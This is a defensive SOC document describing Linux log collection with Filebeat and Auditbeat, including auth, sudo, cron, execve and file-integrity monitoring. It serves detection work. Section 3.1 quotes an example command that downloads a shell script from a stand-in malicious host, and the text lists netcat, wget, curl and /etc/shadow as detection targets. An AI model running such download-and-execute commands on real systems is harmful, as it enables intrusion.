# Log Collection Strategy: Linux Environment

**Version:** 1.0
**Date:** June 2026
**Role:** SOC Analyst / Detection Engineer

---

## 1. Overview
Linux servers (web servers, databases, infrastructure nodes) are prime targets for initial access and lateral movement. Unlike Windows, which relies heavily on Event IDs, Linux logs are text-based and typically handled by the `syslog` daemon or `journald`. 

This document outlines the critical log streams we capture via Filebeat and Auditbeat from our Ubuntu endpoints.

---

## 2. Standard Text Logs (Filebeat)

We utilize Filebeat with the `system` module enabled to parse standard `/var/log/*` files into structured JSON data for Elasticsearch.

### 2.1 Authentication Logs (`/var/log/auth.log`)
This is the most critical file for monitoring access to Debian/Ubuntu systems. It records all authentication mechanisms (SSH, PAM, sudo).

| Log Event / Keyword | Why It Matters for SOC |
| :--- | :--- |
| `sshd: Failed password` | Indicates a failed SSH login attempt. High volumes indicate SSH brute-forcing (MITRE T1110). |
| `sshd: Accepted publickey` | Normal authentication, but tracked to identify unusual login times or unusual source IPs. |
| `sshd: Accepted password` | In modern enterprises, SSH should require keys. Password logins might indicate a misconfiguration or a compromised legacy account. |

### 2.2 Privilege Escalation (Sudo Logs)
When a user attempts to run a command as root using `sudo`, it is logged in `auth.log`.

| Log Event / Keyword | Why It Matters for SOC |
| :--- | :--- |
| `sudo: COMMAND=...` | Tracks exactly what administrative commands are being executed. We look for suspicious commands like `sudo bash` or `sudo useradd`. |
| `sudo: NOT in sudoers` | Indicates a standard user attempted to escalate privileges but was denied. A strong indicator of an insider threat or compromised low-privileged account. |

### 2.3 System Logs (`/var/log/syslog` or `/var/log/messages`)
Contains general system activity, service startup/shutdown messages, and cron job executions.

| Log Event / Keyword | Why It Matters for SOC |
| :--- | :--- |
| `cron[...]: (root) CMD` | Attackers heavily utilize cron jobs (scheduled tasks) for persistence (MITRE T1053.003). We monitor for unusual cron creations or executions. |
| `kernel: iptables denied`| Firewall drops can indicate an attacker attempting to map internal networks or exfiltrate data over blocked ports. |

## 3. Advanced Telemetry (Auditbeat / Auditd)

Standard text logs do not show us what processes are executing in real-time or if critical files have been altered. We deploy Auditbeat to interface with the Linux Audit Framework (`auditd`).

### 3.1 Process Execution Monitoring (`execve`)
By configuring Auditbeat to monitor the `execve` system call, we can log every command executed on the system, regardless of whether it was typed in a terminal or spawned by a web shell.

| Audit Metric | Why It Matters for SOC |
| :--- | :--- |
| **process.name** | Allows us to spot execution of suspicious binaries like `netcat`, `wget`, `curl`, or compiled malware. |
| **process.args** | Crucial for identifying *how* a binary was used. For example, `wget http://malicious.com/shell.sh` provides the exact IOCs needed for an investigation. |

### 3.2 File Integrity Monitoring (FIM)
Attackers will often replace legitimate system binaries (e.g., `ps`, `ls`, `sshd`) with rootkits, or modify configuration files to maintain access.

| Audit Metric | Why It Matters for SOC |
| :--- | :--- |
| **file.path** | We monitor directories like `/etc/passwd`, `/etc/shadow`, `/bin`, and `/usr/sbin`. Any modification to these paths triggers an immediate high-severity alert. |
| **file.hash** | Capturing the SHA-256 hash of modified files allows analysts to instantly query Threat Intelligence (e.g., VirusTotal) to determine if a dropped file is malicious. |

---

## 4. Conclusion
By combining the authentication visibility of Filebeat with the deep process and file integrity monitoring of Auditbeat, we ensure that no attacker can establish a foothold, execute commands, or escalate privileges on our Linux infrastructure without generating a high-fidelity alert in the SIEM.
